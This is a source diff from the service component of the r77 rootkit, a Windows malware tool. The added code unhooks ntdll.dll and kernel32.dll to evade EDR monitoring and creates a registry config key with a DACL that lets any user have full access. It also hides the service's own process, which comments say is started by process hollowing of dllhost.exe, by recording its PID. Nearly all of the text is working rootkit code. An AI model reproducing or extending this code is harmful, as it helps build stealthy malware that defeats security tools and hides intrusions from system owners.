@@ -2,6 +2,15 @@
 
 int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
+	// Unhook DLL's that are monitored by EDR.
+	UnhookDll(L"ntdll.dll");
+	if (IsWindows10OrGreater() || sizeof(LPVOID) == 8)
+	{
+		// Unhooking kernel32.dll on Windows 7 x86 fails.
+		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
+		UnhookDll(L"kernel32.dll");
+	}
+
 	InitializeApi(INITIALIZE_API_SRAND | INITIALIZE_API_DEBUG_PRIVILEGE);
 
 	// Get r77 DLL.
@@ -10,16 +19,23 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
 	// Terminate already running r77 service processes of the same bitness as the current process.
 	TerminateR77Service(GetCurrentProcessId());
 
-	// Write current process ID to the list of hidden PID's.
-	// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
-	// Therefore, process hiding by PID must be used.
-	HKEY pidKey;
-	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &pidKey, NULL) == ERROR_SUCCESS)
+	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
+	HKEY configKey;
+	if (InstallR77Config(&configKey))
 	{
-		// The registry values "svc32" and "svc64" are reserved for the r77 service.
-		DWORD processId = GetCurrentProcessId();
-		RegSetValueExW(pidKey, sizeof(LPVOID) == 4 ? L"svc32" : L"svc64", 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
-		RegCloseKey(pidKey);
+		// Write current process ID to the list of hidden PID's.
+		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
+		// Therefore, process hiding by PID must be used.
+		HKEY pidKey;
+		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &pidKey, NULL) == ERROR_SUCCESS)
+		{
+			// The registry values "svc32" and "svc64" are reserved for the r77 service.
+			DWORD processId = GetCurrentProcessId();
+			RegSetValueExW(pidKey, sizeof(LPVOID) == 4 ? L"svc32" : L"svc64", 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
+			RegCloseKey(pidKey);
+		}
+
+		RegCloseKey(configKey);
 	}
 
 	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
